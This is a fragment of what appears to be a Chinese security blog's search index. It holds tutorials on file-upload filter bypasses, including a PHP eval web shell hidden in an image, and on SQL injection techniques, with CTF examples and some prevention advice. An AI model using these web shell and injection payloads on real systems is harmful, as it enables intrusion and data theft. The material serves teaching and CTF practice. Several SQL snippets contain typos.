class="hljs-variable">$name</span>);<br>--&gt;<br><br></code></pre></td></tr></table></figure></li></ol><p>该源码使用了str_ireplace()函数，该函数时用来替换数组中的文件后缀，当我们文件后缀有array数组中的字符串时，函数自动把他替换为空字符，使文件不合规范，发生报错</p><p>也就是我们的1.php文件变为了1.文件，想要绕过，我们只需要双写后缀1.pphphp，文件读取到php替换为空字符后，照样还是1.php文件</p><h1 id="DATA绕过"><a href="#DATA绕过" class="headerlink" title="::$DATA绕过"></a>::$DATA绕过</h1><p>在windows中，如果遇见文件名+::$DATA的话，会将DATA后的数据看成为数据流，如</p><p>1.php::$DATAabc 会被看成1.php</p><p>其目的是为了绕过文件后缀检查,在上传到winods时，会自动删去::%DATA</p><h2 id="文件头检查"><a href="#文件头检查" class="headerlink" title="文件头检查"></a>文件头检查</h2><p>有些服务端不仅要MIME检测看文件的类型，还要看后缀，可能还要看文件头的格式是否正确，任何文件都可以用十六进制编写<br><img src="https://img-blog.csdnimg.cn/20210714094507758.png" alt="在这里插入图片描述"><br>用十六进制打开文件后，不同类型的文件都有他们固定的文件头和文件尾。服务器可能就通过看这些文件头文件尾来判断该文件是什么文件</p><ul><li>绕过方法-1<br>  通过自己准备一个简单的jpg文件(最好是空白的，可以用QQ截图工具)，若是jpg文件过于复杂可能会导致转换的十六进制太长。<br>  用记事本打开jpg文件，然后再末端加上我们的木马代码  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>  再把文件后缀改为.php，这样的php文件就jpg的文件头了  要想是php文件有jpg文件的文件尾，只需要把木马脚本写到jpg文件的开头</li><li>绕过方法-2<br>  可以通过打开cmd 输入命令将一个php文件和一个jpg文件合起来，然后生成自己想要的形式</li></ul><p><img src="https://img-blog.csdnimg.cn/2021071516310315.png#_center" alt="在这里插入图片描述"></p>]]></content>
    
    
    
    <tags>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql注入原理(2)</title>
    <link href="/2021/07/10/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/"/>
    <url>/2021/07/10/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>有sql注入漏洞产生的原理，便还有sql注入的原理，通过什么样的方式去实现sql注入，并且输入哪些命令来达到注入的效果。</p><span id="more"></span><h1 id="sql注入原理基础-入门"><a href="#sql注入原理基础-入门" class="headerlink" title="sql注入原理基础(入门)"></a>sql注入原理基础(入门)</h1><h2 id="sql内重要的表-sql注入基石"><a href="#sql内重要的表-sql注入基石" class="headerlink" title="sql内重要的表(sql注入基石)"></a>sql内重要的表(sql注入基石)</h2><ul><li><p>在Mysql 5.0以上版本，定义了<strong>information_schema</strong>数据库,用来存储数据库元信息。<br>其中<strong>schemata</strong>表中：<strong>schema_name</strong>用来存储数据库名.</p></li><li><p><strong>tables</strong>表中：<strong>table_schema</strong>和<strong>table_name</strong>分别用来存储数据库名和表名。</p></li><li><p><strong>columns</strong>表中:<strong>table_schema</strong>(数据库名)，<strong>table_name</strong>(表名)，<strong>column_name</strong>(字段名)</p></li></ul><p>sql注入就是在注入点(可以理解为应该输入数据的地方)输入了相关的sql命令，导致命令被执行的情况。</p><p>有了以上的表我们就可以通过命令来获取我们想要的信息。</p><h2 id="集中常见的注入类型-包括实例"><a href="#集中常见的注入类型-包括实例" class="headerlink" title="集中常见的注入类型(包括实例)"></a>集中常见的注入类型(包括实例)</h2><h3 id="整型注入-以ctfhub-技能树web中sql注入的整型注入为例"><a href="#整型注入-以ctfhub-技能树web中sql注入的整型注入为例" class="headerlink" title="整型注入(以ctfhub 技能树web中sql注入的整型注入为例)"></a>整型注入(以ctfhub 技能树web中sql注入的整型注入为例)</h3><p>题目输入1后，我们可以看到相关的sql语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sele <span class="hljs-operator">*</span><span class="hljs-keyword">from</span> news <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210710193652853.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTUzODE0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">这是一个简单的sql查询语句，也是一个最基本的整型注入，当没有相关sql提示语句时，我们可以通过一下三个步骤判断该题存在整数型注入</p><ol><li>加单引号<br>对应的sql：select * from table where id=3’      这时sql语句出错，程序报错；</li><li>加and 1=1<br>对应的sql：select * from table where id=3’ and 1=1    此时语句正常运行</li><li>加and 1=2<br>对应的sql：select * from table where id=3 and 1=2 语句可以正常执行，但是无法查询出结果<br>若以上三点都满足，则该题存在整数型注入</li></ol><p>接下来是解题方法:</p><ol><li><p>判断字段的数目<br>order by 在sql中通常用于排序,但在sql注入中通常用于判断字段的数目，如</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> news <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>如果程序正常运行，当order by 3时程序报错，则说明数据库中只有两个字段</p></li><li><p>判断插入位置</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> news <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>id后面一定是能让数据库报错的数<br>union select 是联合语句在执行 select * from news where id=-1后<br>又执行select 1,2语句，由于前半句报错不能回显不能正确显示，所以回显只显示后半句<br><img src="https://img-blog.csdnimg.cn/20210710200606847.png" alt="在这里插入图片描述"></p></li><li><p>获取数据库名和版本</p>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span><span class="hljs-keyword">from</span> news <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> database()，version()<br></code></pre></td></tr></table></figure><p>   database()和version()分别用于查看当前数据库和mysql版本<br>   如果msql版本属于5.0版本则，我们可以通过前文所提到的information_schema中表来获取关键信息</p></li><li><p>获取所有库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> news <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<br>group_concat(schema_name)<span class="hljs-keyword">from</span> information_schema.schemata<br></code></pre></td></tr></table></figure><p>group _concat()可以讲列中的所有信息给合在一起，<br><img src="https://img-blog.csdnimg.cn/20210710201623407.png" alt="在这里插入图片描述">    途中红框内就是我们所有的数据库</p></li><li><p>通过相同方法，我们可以用schemata表和tables表和columns表获取数据库中所有的表和字段的信息</p></li></ol><p>这就是最基础的sql整型注入原理</p><h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><p>字符型注入在整数型注入上由较少改动</p><p>整数型的sql查询语句为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">selsect <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> news <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>而<strong>字符型</strong>注入的查询语句 为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> news <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span> <span class="hljs-string">&#x27; 1 &#x27;</span><br></code></pre></td></tr></table></figure><p>用户真正输入的内容为1，倘若输入sql语句则会被自动当作字符串，就不能起到我们输入的sql语句被运行的作用</p><p>此时我们需要用到注释符号<br>mysql中注释符号有- -,/* */,#</p><p>通过注释符号我们可以把后面的 ‘ 给注释掉,例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> news <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;</span>#<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>我们在输入框中输入的是1’#<br>这样就导致系统识别的sql语句为select * from news where id =’1’</p><p>之后的注入步骤便与整型注入相同了，例如判断诸如点：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> news <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span><span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span> #<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><ul><li><p>原理：<br>  通常我们在sql注入时，并不会有相关内容的回显，我们只能看见输入正确或错误类的信息。所以用之前的sql注入我们无法获取我们想要的信息。</p><p>  此时我们可以的输入错误的sql语句，把自己想要的信息写入报错语句中，系统会将错误的地方给显示出来，从而实现报错注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> news <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">Union</span> <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat(database(),<span class="hljs-number">0x26</span>,<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x;<br></code></pre></td></tr></table></figure></li></ul><p>最后会如图显示:<br><img src="https://img-blog.csdnimg.cn/20210710205523534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTUzODE0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><ul><li>原理:<br>  有些时候在我们注入时，没有任何回显，不会返回任何信息。但是我们可以判断输入信息正确，会返回正确的页面，错误则返回错误的页面。<br>  此时我们可以使用布尔盲注，例如  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> news <span class="hljs-keyword">where</span> <span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,length(database())<span class="hljs-operator">=</span><span class="hljs-number">3</span><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>用来判断database()的长度，如果长度为<span class="hljs-number">3</span>，则返回正确的页面<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> news <span class="hljs-keyword">where</span> <span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,ascll(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-number">100</span> <br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>用于判断database()的第一个字母的ascll码是否为<span class="hljs-number">100</span>，使用ascll码的原因是方便python循环<br></code></pre></td></tr></table></figure>  在遇到布尔盲注时，由于我们只能一个一个地判断字符，人工输入很麻烦，通常搭配python脚本去做，在判断关键信息的字符时，通常使用ascll码去做，一是方便循环，二是可以使用二分法等算法，节省时间</li></ul><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><ul><li><p>原理<br>  部分网页注入时，既不返回信息，也不报错，同时输入错误的注入信息也不会返回错误的页面，我们无法判断自己的sql语句是否正确</p><p>  在sql语句中sleep(n)函数的意思是在查询时等待n秒，利于这个函数，我们可以通过等待时间来判断我们注入的sql语句是否正确，例如</p>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> news <span class="hljs-keyword">where</span> <span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,if(length(database())<span class="hljs-operator">=</span><span class="hljs-number">3</span>,<span class="hljs-number">1</span>,sleep(<span class="hljs-number">2</span>))<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>该代码的意思为：如果数据库的长度为<span class="hljs-number">3</span>，则返回<span class="hljs-number">1</span>，否则返回延迟<span class="hljs-number">2</span>秒<br></code></pre></td></tr></table></figure><p>  我们可以通过返回页面是否有延迟来判断语句是否对错，判断关键信息的方法和布尔盲注类似。</p></li></ul><h3 id="Cookie注入、UA注入、Refer注入"><a href="#Cookie注入、UA注入、Refer注入" class="headerlink" title="Cookie注入、UA注入、Refer注入"></a>Cookie注入、UA注入、Refer注入</h3><p>注入点除了文本框和url之外，在用户提交的包中可能也有注入点</p><ul><li><p>原理：<br>  在用户提交的包中，用户通过Cookie、UA、Referer三种方式，把自己的一些信息传递给服务器，管理员可能会通过连接数据库来获取这三种信息。</p><p>  就Referer举例，是服务器用来知道你是从哪个地方访问该服务器的，也就是你点击该服务器的来源，从而判断你的权限。</p><p>  Cookie、UA同样如此，都是管理员为了获取你的信息，一但管理员将你的信息和数据库连接并且没有任何过滤时，就可以使用sql注入了</p></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql注入漏洞原理(1)</title>
    <link href="/2021/07/10/SQL%E6%B3%A8%E5%85%A5/"/>
    <url>/2021/07/10/SQL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p>sql注入是当今web最具有危害的漏洞之一，在web漏洞里出现的次数可以说是名列前茅<br>本文主要是讲述sql注入漏洞的原理，这个漏洞是如何产生，以及如何防范sql漏洞</p><span id="more"></span><h2 id="漏洞产生原理"><a href="#漏洞产生原理" class="headerlink" title="漏洞产生原理"></a>漏洞产生原理</h2><p>sql注入是用户在提交参数时参杂了sql注入代码，并且被后端执行了，这样就导致漏洞的产生<br>归根到底就是程序员没有对参数进行过滤，以及防护，下面举了几个典型的注入例子</p><p>下面是一个有注入漏洞的登陆界面的后端</p><p>用户通过前端把账号和密码分别提交到$userName 和$Password中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$conn</span>=mysqli_connect(<span class="hljs-variable">$dbServername</span>,<span class="hljs-variable">$dbUsername</span>,<span class="hljs-variable">$dbPassword</span>,<span class="hljs-variable">$dbName</span>);<span class="hljs-comment">//连接数据库</span><br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM user WHERE username=&#x27;<span class="hljs-subst">$userName</span>&#x27; and password=&#x27;<span class="hljs-subst">$Password</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$result</span>=mysqli_query(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$sql1</span>)；<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;log in&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123; <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;erro&quot;</span>; &#125;<br></code></pre></td></tr></table></figure><p>可以看到，用户提交的账号和密码直接被连接数据库使用了，并且以返回结果的成功与否来判断是否</p><p>这样当我们输入账户时输入 1’ or 1=1#<br>这样我们的连接mysql的语句就是</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">WHERE</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>#<span class="hljs-string">&#x27; and password=&#x27;</span>$Password<span class="hljs-string">&#x27;&quot;</span><br></code></pre></td></tr></table></figure><p>可以看到后面输入密码的部分被#给注释掉了，而且最终这条语句被执行后返回值一定是真</p><p>也就是$result一定为真，那么我们不用输入密码就直接登录成功了,这就是一个简单的post注入</p><h2 id="0X01-sql注入原理"><a href="#0X01-sql注入原理" class="headerlink" title="#0X01 sql注入原理"></a>#0X01 sql注入原理</h2><p>我们知道了sql注入漏洞的原理后，还得知道sql注入的原理，这样能方便我们对sql注入更好的理解</p><h3 id="mysql中重要的表"><a href="#mysql中重要的表" class="headerlink" title="mysql中重要的表"></a>mysql中重要的表</h3><p>在Mysql 5.0以上版本，定义了<strong>information_schema</strong>数据库,用来存储数据库元信息。<br>其中<strong>schemata</strong>表中：<strong>schema_name</strong>用来存储数据库名.</p><p><strong>tables</strong>表中：<strong>table_schema</strong>和<strong>table_name</strong>分别用来存储数据库名和表名。</p><p><strong>columns</strong>表中:<strong>table_schema</strong>(数据库名)，<strong>table_name</strong>(表名)，<strong>column_name</strong>(字段名)</p><p>通过这些表，我们能把数据库中几乎所有的数据都给查询到，也是sql注入的基石</p><h3 id="简单的sql注入案例（整型注入）"><a href="#简单的sql注入案例（整型注入）" class="headerlink" title="简单的sql注入案例（整型注入）"></a>简单的sql注入案例（整型注入）</h3><p>这是一道简单的有整型注入的题<br><img src="https://img-blog.csdnimg.cn/20210710193652853.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTUzODE0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">当我们输入1时，其后端内部信息是</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sele <span class="hljs-operator">*</span><span class="hljs-keyword">from</span> news <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>于是我们就可以通过输入sql语句，达到注入效果</p><p>当我们输入-1 union select 1,2时可以看到，对应的回显变成了我们的1,2<br>    <img src="https://img-blog.csdnimg.cn/20210710200606847.png" alt="在这里插入图片描述"></p><p>我们也可以通过 select *from news where id=-1 union select database()，version()来查询数据库对应的版本</p><p>这里我用 select * from news where id=-1 union select 1, group_concat(schema_name)from information_schema.schemata来查询所有的数据库<br> <img src="https://img-blog.csdnimg.cn/20210710201623407.png" alt="在这里插入图片描述">图中红框内就是我们所有的数据库</p><p> 通过相同方法，我们可以用schemata表和tables表和columns表获取数据库中所有的表和字段的信息</p><p>这就是最基础的sql整型注入原理，还有其他注入类型在我的另一篇有详细解释<a href="https://blog.csdn.net/qq_51553814/article/details/118639300">sql注入案例</a></p><h2 id="0X02-sql注入防范"><a href="#0X02-sql注入防范" class="headerlink" title="#0X02 sql注入防范"></a>#0X02 sql注入防范</h2><p>既然发现了漏洞就需要我们进行防范了<br>通常是以下几个防范办法</p><ol><li>数据库的普通用户权限和管理员权限分明，用户提交数据后，所连接的数据库权限应该是普通用户级别，这样就防止了sql注入代码对数据库进行增加或删除数据的操作</li><li>将用户输入的语句参数化，而不是直接嵌入到sql语句当中，这样的好处就是我们可以对用户提交上去的数据进行验证和过滤，过滤主要是过滤掉空格或者是特殊字符，甚至可以把sql注入中的一些敏感字符给过滤掉</li><li>对用户加以输入加以限制，在后端对用户输入添加字符限制，如果你只想用户输入数字，那么就对相应的参数加以验证，其他的同样如此，尽量让用户只能输入你想要他输入的东西。</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
